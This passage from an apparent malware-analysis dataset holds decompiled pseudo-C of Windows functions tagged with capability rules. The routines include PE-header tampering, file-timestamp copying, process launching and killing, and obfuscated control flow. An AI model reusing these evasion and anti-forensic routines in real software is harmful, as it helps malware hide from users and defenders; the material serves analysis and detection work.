unaff_ESI = unaff_ESI & 0xffff0000 | uStack46;\ncode_r0x00401c0a:\n            if (uVar14 || uVar16) break;\ncode_r0x00401c1e:\n            uStack46 = 0x7490;\n            fVar21 = fcn.00402f20();\n            if ((uVar14 || uVar16) || (!uVar14 && !uVar16)) {\n                fcn.00402f20();\n                uStack2 = 0x40;\n                uStack6 = 0x72f0;\n                uStack4 = 0x40;\n                uStack10 = 0xf;\n                uStack8 = 0;\n                uStack14 = 0x7490;\n                uStack12 = 0x40;\n                uStack18 = 0x91;\n                uStack17 = 0x1c;\n                uStack16 = 0x40;\n                fcn.00402f20();\n                uStack2 = 0xc;\n                uStack6 = 0x7330;\n                uStack4 = 0x40;\n                uStack10 = 0xf;\n                uStack8 = 0;\n                uStack14 = 0x7490;\n                uStack12 = 0x40;\n                uStack18 = 0xb2;\n                uStack17 = 0x1c;\n                uStack16 = 0x40;\n                fcn.00402f20();\n                bVar19 = SCARRY1(extraout_DX, extraout_DX >> 8);\n                uStack2 = 0xb;\n                uStack6 = 0x733c;\n                uStack4 = 0x40;\n                uStack10 = 0xf;\n                uStack8 = 0;\n                uStack14 = 0x7490;\n                uStack12 = 0x40;\n                uStack18 = 0xd0;\n                uStack17 = 0x1c;\n                uStack16 = 0x40;\n                fcn.00402f20();\n                if ((!bVar19) && (bVar19)) {\n                    *CONCAT22(uStack12, uStack14) = param_3._2_4_;\n                    return;\n                }\n                uStack18 = 4;\n                uStack17 = 0;\n                uStack16 = 0;\n                uStack22 = 0x7348;\n                uStack20 = 0x40;\n                uStack24 = 0;\n                fcn.00402f20();\n                uStack20 = unaff_EBP >> 0x10;\n                uStack24 = unaff_ESI >> 0x10;\n                uStack2 = 4;\n                uStack6 = 0x734c;\n                uStack4 = 0x40;\n                uStack10 = 0xf;\n                uStack8 = 0;\n                uStack14 = 0x7490;\n                uStack12 = 0x40;\n                uStack18 = 0x25;\n                uStack17 = 0x1d;\n                uStack16 = 0x40;\n                uStack22 = unaff_EBP;\n                fcn.00402f20();\n                bVar19 = false;\n                bVar17 = (uVar3 & 0x4d) == 0;\n                uStack2 = 0xc;\n                uStack6 = 0x7350;\n                uStack4 = 0x40;\n                uStack10 = 0xf;\n                uStack8 = 0;\n                uStack14 = 0x7490;\n                uStack12 = 0x40;\n                uStack18 = 0x40;\n                uStack17 = 0x1d;\n                uStack16 = 0x40;\n                fcn.00402f20();\n                if ((bVar19 || bVar17) || (!bVar19 && !bVar17)) {\n                    uStack18 = 4;\n                    uStack17 = 0;\n                    uStack16 = 0;\n                    uStack22 = 0x735c;\n                    uStack20 = 0x40;\n                    uStack24 = 0;\n                }\n                else {\n                    *piVar13 = *unaff_ESI;\n                    unaff_ESI = unaff_ESI + 1;\n                    piVar13 = piVar13 + 1;\n                }\n                *(extraout_EDX_00 + 0xf) = *(extraout_EDX_00 + 0xf) + extraout_CH_00;\n                fcn.00402f20();\n                uStack2 = 9;\n                uStack6 = 0x7360;\n                uStack4 = 0x40;\n                uStack10 = 0xf;\n                uStack8 = 0;\n                uStack14 = 0x7490;\n                uStack12 = 0x40;\n                uStack18 = 0x8f;\n                uStack17 = 0x1d;\n                uStack16 = 0x40;\n                fcn.00402f20();\n                uVar14 = extraout_DL + 0x15U < extraout_AH_00;\n                cVar18 = extraout_DL + 0x15U == extraout_AH_00;\n                goto code_r0x00401d9e;\n            }\n            if (!uVar20) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            puVar2 = unaff_ESI + 0x56;\n            uVar14 = CARRY1(*puVar2, extraout_AH);\n            uVar20 = SCARRY1(*puVar2, extraout_AH);\n            *puVar2 = *puVar2 + extraout_AH;\n            uVar16 = *puVar2 == 0;\n            uVar15 = (POPCOUNT(*puVar2) & 1U) == 0;\n            uVar9 = extraout_ECX_01;\n        }\n        if (!uVar20) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    } while( true );\n    uVar6 = *puVar4;\n    uVar10 = uVar9 >> 8;\n    uVar5 = uVar6 + uVar10;\n    piVar7 = *puVar4 & 0xffffff00 | uVar5;\n    piVar12 = piVar13 + 1;\n    *piVar13 = uVar5;\n    pcVar1 = piVar7 + CARRY1(uVar6, uVar10) + *piVar7 + 0xf;\n    *pcVar1 = *pcVar1 + uVar11;\n    bVar19 = *pcVar1 < '\\0';\n    goto code_r0x00401b78;\n    while (extraout_ECX_02 != 1 && cVar18 != '\\0') {\ncode_r0x00401d9e:\n        uStack4 = 0x40;\n        uStack6 = 0x736c;\n        uStack8 = 0;\n        uStack10 = 0xf;\n        uStack2 = 0x7490;\n        uStack18 = 0xaf;\n        uStack17 = 0x1d;\n        uStack16 = 0x40;\n        fcn.00402f20();\n        if ((uVar14) || (!uVar14)) goto code_r0x00401dca;\n    }\n    *piVar13 = unaff_ESI + 1;\ncode_r0x00401dca:\n    uStack14 = 0x7384;\n    uStack12 = 0x40;\n    uStack18 = 0xf;\n    uStack17 = 0;\n    uStack16 = 0;\n    uStack22 = 0x7490;\n    uStack20 = 0x40;\n    uStack24 = 0x40;\n    fcn.00402f20();\n    return;\n}\n",
        "token_count": 3897
    },
    "00403490": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403552) overlaps instruction at (ram,0x00403550)\n// \n// WARNING: Removing unreachable block (ram,0x00403589)\n// WARNING: Removing unreachable block (ram,0x004035fd)\n\nuint __cdecl fcn.00403490(int16_t *arg_8h)\n\n{\n    char *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    ushort uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    ushort in_DX;\n    uint32_t uVar7;\n    int16_t *piVar8;\n    uint *puVar9;\n    int32_t unaff_EDI;\n    uint *puVar10;\n    ushort in_SS;\n    char in_AF;\n    bool bVar11;\n    bool bVar12;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    piVar5 = *(arg_8h + 0x1e) + arg_8h;\n    bVar11 = *piVar5 != 0x4550;\n    if (bVar11) {\n        return 0;\n    }\n    if (bVar11) {\n        uVar4 = SUB42(piVar5, 0);\n        piVar5 = (piVar5 >> 8 & 0xffff00) << 8 | piVar5 & 0xffff;\n        if (!bVar11) {\n            unaff_EDI = CONCAT22(uVar4, in_SS);\n            uVar6 = 0x47;\n            goto code_r0x0040351b;\n        }\n    }\n    uVar6 = piVar5[0x16];\ncode_r0x0040351b:\n    bVar12 = uVar6 < 0;\n    bVar11 = uVar6 != 0;\n    if (bVar11) {\n        return 0;\n    }\n    uVar7 = 0x40;\n    var_4h = 0x40;\n    piVar8 = arg_8h;\n    if ((bVar11) && (!bVar11)) {\n        uVar7 = 0x41;\n        uVar6 = CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f;\n        *(uVar6 + 0x2a) = *(uVar6 + 0x2a) + -0x41;\n        piVar8 = arg_8h + 1;\n        bVar12 = piVar8 < 0;\n    }\n    if ((bVar12) || (!bVar12)) {\n        if (0x80 < *(piVar8 + 0x1e)) {\n            if (*(piVar8 + 0x1e) < 0xc0) {\n                uVar7 = *(piVar8 + 0x1e) - 0x80;\n                var_4h = uVar7;\n            }\n            puVar2 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(uVar7);\n            bVar11 = (POPCOUNT(puVar2 & 0xff) & 1U) != 0;\n            if (puVar2 != NULL) {\n                if ((bVar11) && (!bVar11)) {\n                    puVar9 = segment(in_SS, *0x10 + -0x18);\n                    if (!bVar11) {\n                        return *puVar9;\n                    }\n                }\n                uVar6 = 0;\n                if (uVar7 != 0) {\n                    do {\n                        iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n                        uVar7 = uVar6 + 1;\n                        *(uVar6 + puVar2) = iVar3 % 0xff;\n                        uVar6 = uVar7;\n                    } while (uVar7 < var_4h);\n                }\n                puVar9 = puVar2;\n                puVar10 = arg_8h + 0x40;\n                for (uVar6 = var_4h >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n                    *puVar10 = *puVar9;\n                    puVar9 = puVar9 + 1;\n                    puVar10 = puVar10 + 1;\n                }\n                for (var_4h = var_4h & 3; var_4h != 0; var_4h = var_4h - 1) {\n                    *puVar10 = *puVar9;\n                    puVar9 = puVar9 + 1;\n                    puVar10 = puVar10 + 1;\n                }\n                sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar2);\n                return 1;\n            }\n            return 0;\n        }\n    }\n    else {\n        pcVar1 = uVar6 + 0x803c7e81;\n        *pcVar1 = *pcVar1 + pcVar1;\n        *(unaff_EDI + 9) = *(unaff_EDI + 9) + (in_DX >> 8);\n    }\n    return 0;\n}\n",
        "token_count": 1147
    },
    "00404490": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004045af)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404490(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uchar var_260h;\n    uint var_25fh;\n    uchar s;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401df0();\n    iVar4 = fcn.00403c70();\n    if (iVar4 != 0) {\n        var_260h = 0;\n        puVar5 = &var_25fh;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        *puVar5 = 0;\n        *(puVar5 + 2) = 0;\n        iVar4 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &var_260h, 0x26, 0);\n        if (iVar4 != 0) {\n            fcn.00401370();\n            s = 0;\n            puVar5 = &var_15bh;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x4073ac, &var_260h, 0x40738c, 3);\n            pcVar3 = _sym.imp.USER32.dll_EnumWindows;\n            pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n            var_14h = 0;\n            do {\n                puVar5 = &var_58h;\n                for (iVar4 = 0x11; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 1;\n                }\n                var_28h._0_2_ = 0;\n                hProcess = 0;\n                var_ch = 0;\n                var_58h = 0x44;\n                var_8h = 0;\n                var_2ch = 1;\n                var_4h = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &s, 0, 0, 0, 0, 0, 0, &var_58h, &hProcess);\n                if (iVar4 == 0) {\n                    return;\n                }\n                (*pcVar1)(3000);\n                (*pcVar3)(fcn.00404380, var_8h);\n                iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hProcess, 1000);\n                if (iVar4 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 1);\n                }\n                pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar2)(hProcess);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 845
    },
    "00402820": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402820(void)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_EDI;\n    \n    iVar1 = fcn.00401340(0x407010);\n    if (iVar1 != -1) {\n        if ((-2 < iVar1) && (iVar1 < -1)) {\n            out(0xc4, iVar1);\n            *unaff_EDI = iVar1;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 123
    },
    "00402b20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402b6b)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402b20(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = (**0x4235b8)();\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar3 = &var_12ch;\n    var_8h = iVar1;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x4235bc)();\n    do {\n        if (iVar2 == 0) {\ncode_r0x00402be1:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_4h;\n        }\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, arg_8h);\n        if (iVar2 == 0) {\n            var_4h = var_128h;\n            iVar1 = var_8h;\n            goto code_r0x00402be1;\n        }\n        iVar2 = (**0x4235c0)(iVar1, &var_130h);\n    } while( true );\n}\n",
        "token_count": 393
    },
    "00403070": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004031c6) overlaps instruction at (ram,0x004031c4)\n// \n// WARNING: Removing unreachable block (ram,0x004031c6)\n// WARNING: Removing unreachable block (ram,0x0040316e)\n// WARNING: Removing unreachable block (ram,0x0040311e)\n\nuint64_t fcn.00403070(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    char *pcVar9;\n    char *pcVar10;\n    char *pcVar11;\n    uint *puVar12;\n    uint16_t in_ES;\n    bool bVar13;\n    uint64_t uVar14;\n    uchar *puVar15;\n    uchar uStack560;\n    uint uStack559;\n    uint uStack552;\n    uchar uStack300;\n    uint uStack299;\n    uchar auStack40 [4];\n    uchar auStack36 [8];\n    uchar auStack28 [8];\n    uchar auStack20 [16];\n    \n    _uStack560 = _uStack560 & 0xffffff00;\n    uStack300 = '\\0';\n    puVar8 = &uStack560 + 1;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    bVar13 = false;\n    puVar8 = &uStack300 + 1;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    puVar8 = &uStack560;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(puVar8, 0x104);\n    if ((!bVar13) && (bVar13)) {\n        *puVar8 = uStack552;\n        return CONCAT44(_uStack560, uStack552);\n    }\n    uVar4 = 0xffffffff;\n    pcVar10 = &uStack560;\n    do {\n        pcVar9 = pcVar10;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar9 = pcVar10 + 1;\n        cVar1 = *pcVar10;\n        pcVar10 = pcVar9;\n    } while (cVar1 != '\\0');\n    uVar4 = ~uVar4;\n    puVar8 = pcVar9 + -uVar4;\n    puVar12 = &uStack300;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar12 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar12 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    uVar4 = 0xffffffff;\n    pcVar10 = 0x407048;\n    do {\n        pcVar9 = pcVar10;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar9 = pcVar10 + 1;\n        cVar1 = *pcVar10;\n        pcVar10 = pcVar9;\n    } while (cVar1 != '\\0');\n    uVar4 = ~uVar4;\n    iVar3 = -1;\n    pcVar10 = &uStack300;\n    do {\n        pcVar11 = pcVar10;\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        pcVar11 = pcVar10 + 1;\n        cVar1 = *pcVar10;\n        pcVar10 = pcVar11;\n    } while (cVar1 != '\\0');\n    puVar8 = pcVar9 + -uVar4;\n    puVar12 = pcVar11 + -1;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar12 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar12 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    puVar15 = &uStack300;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(puVar15, 0, auStack40);\n    bVar13 = SBORROW4(param_2, -1);\n    iVar3 = param_2 + 1;\n    iVar7 = param_2;\n    if (param_2 == -1) {\n        uVar14 = fcn.00401340(param_1);\n        iVar2 = uVar14;\n        bVar13 = SBORROW4(iVar2, -1);\n        iVar3 = iVar2 + 1;\n        iVar7 = iVar2;\n        if (iVar2 == -1) {\n            return uVar14 & 0xffffffff00000000;\n        }\n    }\n    if ((bVar13 == iVar3 < 0) && (bVar13 != iVar3 < 0)) {\n        puVar15 = puVar15 & 0xffff0000 | in_ES;\n        param_2 = param_2 + -1;\n        *(puVar12 | &stack0xfffffffc) = iVar2;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar7, auStack36, auStack28, auStack20, puVar15);\n    uVar6 = extraout_EDX;\n    if (param_2 == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar7);\n        uVar6 = extraout_EDX_00;\n    }\n    return CONCAT44(uVar6, 1);\n}\n",
        "token_count": 1538
    },
    "00403af0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00403af0(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00402140(0x80000002, 0x4072f0, 0x407330, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 151
    },
    "004049d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404a71) overlaps instruction at (ram,0x00404a6c)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004049d0(void)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint8_t extraout_CL;\n    uchar *extraout_ECX;\n    uchar *puVar4;\n    uint *puVar5;\n    uchar *puVar6;\n    uint *unaff_ESI;\n    uchar *unaff_EDI;\n    uchar *puVar7;\n    uint *puVar8;\n    bool bVar9;\n    char cVar10;\n    uint8_t in_IF;\n    bool bVar11;\n    char cVar12;\n    ulong uVar13;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    uint uStack8;\n    \n    bVar11 = false;\n    puVar3 = &stack0xfffffffc;\n    iVar2 = fcn.00402fe0();\n    cVar10 = iVar2 < 0;\n    bVar9 = iVar2 == 0;\n    if (bVar9) {\n        return false;\n    }\n    if ((!bVar9) && (bVar9)) {\n        bVar11 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n        cVar10 = (cVar10 * -0x80 | bVar9 * '@' & 0x80U) != 0;\n    }\n    cVar12 = '\\0';\n    uVar1 = fcn.00401000();\n    if ((cVar12 == cVar10) && (cVar12 != cVar10)) {\n        unaff_ESI = unaff_ESI + -1;\n        puVar7 = unaff_EDI | &stack0xfffffffc;\n        unaff_EDI = puVar7 + bVar11 * -2 + 1;\n        *puVar7 = uVar1;\n    }\n    puVar5 = &stack0xffffff6c;\n    iVar2 = fcn.00402b20(0x407074);\n    cVar12 = SBORROW4(iVar2, -1);\n    cVar10 = iVar2 + 1 < 0;\n    bVar9 = iVar2 == -1;\n    if (!bVar9) {\n        return false;\n    }\n    iVar2 = fcn.00401a30();\n    *0x4235e8 = 1;\n    if ((!bVar9 && cVar12 == cVar10) && (bVar9 || cVar12 != cVar10)) {\n        *(iVar2 + -0x17c625aa) = *(iVar2 + -0x17c625aa) ^ extraout_CL;\n        *unaff_EDI = iVar2;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar2 = fcn.00402820();\n    if (iVar2 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar8 = &fcn.004049d0::var_1fh;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + bVar11 * -2 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + bVar11 * -4 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar8 = &fcn.004049d0::var_80h + 1;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + bVar11 * -2 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + bVar11 * -4 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar8 = &fcn.004049d0::var_60h + 1;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + bVar11 * -2 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + bVar11 * -4 + 2) = 0;\n    puVar8 = &fcn.004049d0::var_40h + 1;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + bVar11 * -2 + 1;\n    }\n    puVar7 = puVar8 + bVar11 * -4 + 2;\n    *puVar8 = 0;\n    *puVar7 = 0;\n    iVar2 = fcn.00405040(&fcn.004049d0::var_80h, &fcn.004049d0::var_60h, &stack0xffffffdc, &fcn.004049d0::var_40h);\n    bVar9 = iVar2 == 0;\n    if (bVar9) {\n        return false;\n    }\n    puVar6 = &stack0xfffffffc;\n    if ((!bVar9) && (puVar6 = &stack0xfffffffc,  bVar9)) {\n        cVar10 = '\\x10';\n        do {\n            puVar3 = puVar3 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar3;\n            cVar10 = cVar10 + -1;\n            puVar6 = &stack0xffffff6c;\n        } while ('\\0' < cVar10);\n    }\n    uVar13 = fcn.00403360(puVar6 + -0x20);\n    bVar9 = uVar13 == 0;\n    if (bVar9) {\n        return false;\n    }\n    if ((bVar9) || (puVar4 = extraout_ECX,  !bVar9)) {\n        puVar4 = puVar6 + -0x60;\n        uVar13 = CONCAT44(puVar6 + -0x80, puVar6 + -0x20);\n    }\n    puVar3 = uVar13;\n    *(puVar7 + bVar11 * -2 + 1) = *unaff_ESI;\n    puVar3[-1] = 0x8de181d0;\n    *0x1b346215 = *0x1b346215 >> 5 | *0x1b346215 << 3;\n    puVar3[-2] = puVar4;\n    puVar3[-3] = uVar13 >> 0x20;\n    puVar3[-4] = 0x404b4d;\n    iVar2 = fcn.00404720(puVar3[-3], puVar3[-2], puVar3[-1], *puVar3);\n    return iVar2 != 0;\n}\n",
        "token_count": 1671
    },
    "004051a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004051b4) overlaps instruction at (ram,0x004051b1)\n// \n\nuint __cdecl fcn.004051a0(uint arg_8h)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    bool in_CF;\n    \n    if ((in_CF) || (!in_CF)) {\n        in_EAX = arg_8h;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(in_EAX, 0);\n    if (iVar1 == -1) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 137
    },
    "00402a80": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402af9) overlaps instruction at (ram,0x00402af7)\n// \n// WARNING: Removing unreachable block (ram,0x00402ab3)\n\nint32_t __thiscall fcn.00402a80(uint8_t param_1, uint32_t param_2, uint16_t *param_3, int32_t param_4)\n\n{\n    uint in_EAX;\n    uint *unaff_EDI;\n    char in_SF;\n    char in_OF;\n    \n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, in_EAX);\n        param_2 = param_2 & 0xffffff00 | param_2 ^ param_1;\n        *unaff_EDI = in_EAX;\n    }\n    if (param_4 != 0) {\n        do {\n            param_2 = param_2 + *param_3;\n            if (param_2 >> 0x10 != 0) {\n                if ((-1 < param_2) && (-1 >= param_2)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                param_2 = (param_2 >> 0x10) + (param_2 & 0xffff);\n            }\n            param_3 = param_3 + 1;\n            param_4 = param_4 + -1;\n        } while (param_4 != 0);\n    }\n    return (param_2 >> 0x10) + param_2;\n}\n",
        "token_count": 355
    },
    "00402df0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e0d) overlaps instruction at (ram,0x00402e0b)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402df0(int32_t arg_8h, int32_t *arg_ch, int32_t arg_10h, int32_t *arg_14h, int32_t arg_18h)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    uchar *unaff_EBX;\n    uint *puVar8;\n    int32_t *unaff_EDI;\n    bool bVar9;\n    bool bVar10;\n    uchar *puStack36;\n    uint var_10h;\n    uint *var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    var_8h = NULL;\n    piVar5 = var_8h;\n    bVar9 = false;\n    bVar10 = arg_14h == NULL;\n    piVar6 = arg_14h;\n    piVar7 = arg_14h * 2;\n    if (arg_14h < 1) {\n        return;\n    }\ncode_r0x00402e11:\n    var_ch = 0x1;\n    var_8h = piVar5;\n    do {\n        if ((bVar9) || (!bVar9)) {\n            piVar7 = *(var_8h + arg_10h);\n            puVar8 = var_ch;\n            puStack36 = unaff_EBX;\n        }\n        else {\n            piVar7 = piVar7 + -1;\n            if (piVar7 != NULL && bVar10) break;\n            uVar2 = *var_ch;\n            *unaff_EDI = var_ch + 1;\n            puVar1 = unaff_EBX + 0xc8af845;\n            uVar3 = *puVar1;\n            uVar4 = *puVar1 + piVar7;\n            *puVar1 = uVar4 + bVar9;\n            unaff_EBX[0x66] = unaff_EBX[0x66] + (uVar2 >> 0x1f) + (CARRY1(uVar3, piVar7) || CARRY1(uVar4, bVar9));\n            puVar8 = 0x8bb8ec44;\n            puStack36 = &var_1h + 1;\n        }\n        uVar3 = *(puVar8 % arg_ch + arg_8h);\n        var_10h._0_1_ = arg_14h * 2;\n        *(arg_18h + -1 + puVar8) = var_10h ^ piVar7 ^ *((puVar8 + -1) % arg_ch + arg_8h);\n        unaff_EBX = CONCAT31(puStack36 >> 8 & 0xffff00 | puStack36 >> 8, uVar3);\n        *(var_ch + arg_18h) = var_10h ^ uVar3;\n        var_ch = var_ch + 2;\n        piVar6 = var_8h + 1;\n        bVar9 = piVar6 < arg_14h;\n        bVar10 = piVar6 == arg_14h;\n        piVar7 = arg_14h;\n        unaff_EDI = arg_ch;\n        var_8h = piVar6;\n        if (arg_14h <= piVar6) {\n            return;\n        }\n    } while( true );\n    *piVar6 = *piVar6 + 1;\n    bVar9 = CARRY1(*piVar6, piVar6);\n    *piVar6 = *piVar6 + piVar6;\n    bVar10 = *piVar6 == 0;\n    goto code_r0x00402e11;\n}\n",
        "token_count": 915
    },
    "00404b90": {
        "rules": [
